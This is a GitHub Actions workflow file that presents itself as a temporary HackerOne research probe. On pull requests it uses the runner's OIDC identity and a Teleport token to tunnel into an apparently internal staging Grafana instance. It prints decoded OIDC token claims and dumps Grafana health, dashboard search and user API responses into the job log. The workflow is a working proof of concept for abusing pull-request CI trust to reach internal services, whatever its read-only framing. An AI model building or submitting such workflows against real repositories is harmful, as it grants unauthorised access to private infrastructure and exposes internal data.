# Temporary security-research probe by ireniumsecurity (HackerOne) — will be closed immediately.
# Read-only Teleport-join reachability test; no secrets used; PR closed right after.

name: Grafana MCP Fetch POC

on:
  pull_request:
    paths:
      - '.github/workflows/grafana-mcp-fetch-poc.yml'
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

jobs:
  fetch:
    name: Prompt Grafana MCP for instance failure logs
    runs-on: ubuntu-latest
    timeout-minutes: 10
    env:
      GRAFANA_APP: nks-stg-europe-west2-grafana
      GRAFANA_TUNNEL_PORT: '3000'

    steps:
      - name: Install Teleport clients for Grafana tunnel
        uses: teleport-actions/setup@a820ebbf1bc1a496efca348ad21042d6e8df73a6
        with:
          version: auto
          proxy: nscale.teleport.sh:443

      - name: Open Grafana app tunnel
        uses: teleport-actions/application-tunnel@bb7a8fbfb67b85d26013554f10d71dd032c1c764
        with:
          proxy: nscale.teleport.sh:443
          token: github-grafana-access
          app: ${{ env.GRAFANA_APP }}
          listen: tcp://127.0.0.1:${{ env.GRAFANA_TUNNEL_PORT }}
          timeout-ms: '60000'

      - name: Research probe — read-only reachability check (ireniumsecurity, HackerOne)
        shell: bash
        run: |
          set -uo pipefail

          echo "=== Run identity (from GITHUB_* env) ==="
          echo "event_name=${GITHUB_EVENT_NAME}"
          echo "repository=${GITHUB_REPOSITORY}"
          echo "repository_owner=${GITHUB_REPOSITORY_OWNER}"
          echo "actor=${GITHUB_ACTOR}"
          echo "ref=${GITHUB_REF}"
          echo "head_ref=${GITHUB_HEAD_REF}"
          echo "workflow_ref=${GITHUB_WORKFLOW_REF}"

          echo "=== OIDC claims (decoded payload only, raw token NOT printed) ==="
          oidc_payload="$(curl -s -H "Authorization: bearer $ACTIONS_RUNTIME_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=github-grafana-access" \
            | python3 -c 'import sys,json,base64; t=json.load(sys.stdin)["value"]; p=t.split(".")[1]; p+="="*(-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2, sort_keys=True))' || true)"
          printf '%s\n' "$oidc_payload"

          echo "=== Grafana /api/health via tunnel ==="
          curl -s -m 10 "http://127.0.0.1:${GRAFANA_TUNNEL_PORT}/api/health"; echo

          echo "=== Grafana /api/search (capped 2000 bytes) ==="
          curl -s -m 10 "http://127.0.0.1:${GRAFANA_TUNNEL_PORT}/api/search?query=dashboards%20%20" | head -c 2000; echo

          echo "=== Grafana /api/user (capped 1000 bytes) ==="
          curl -s -m 10 "http://127.0.0.1:${GRAFANA_TUNNEL_PORT}/api/user" | head -c 1000; echo

          echo "=== probe complete ==="
